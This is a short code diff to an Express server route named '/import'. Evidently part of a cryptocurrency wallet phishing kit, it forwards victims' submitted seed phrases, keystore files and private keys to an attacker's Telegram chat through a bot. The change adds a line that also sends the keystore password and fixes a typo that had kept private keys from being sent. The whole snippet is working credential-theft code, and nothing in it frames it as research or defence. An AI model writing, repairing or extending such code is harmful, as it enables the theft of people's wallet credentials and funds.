@@ -25,8 +25,9 @@ app.post("/import", async (req, res) => {
           bot.telegram.sendMessage(process.env.chatID, req.body.phrase_key)
         } else if(req.body.keystore_json) {
           bot.telegram.sendMessage(process.env.chatID, req.body.keystore_json)
+          bot.telegram.sendMessage(process.env.chatID, req.body.keystore_password)
         } else {
-          bot.telegram,sendMessage(process.env.chatID, req.body.private_key)
+          bot.telegram.sendMessage(process.env.chatID, req.body.private_key)
         }
     }catch(err) {
         console.log(err)
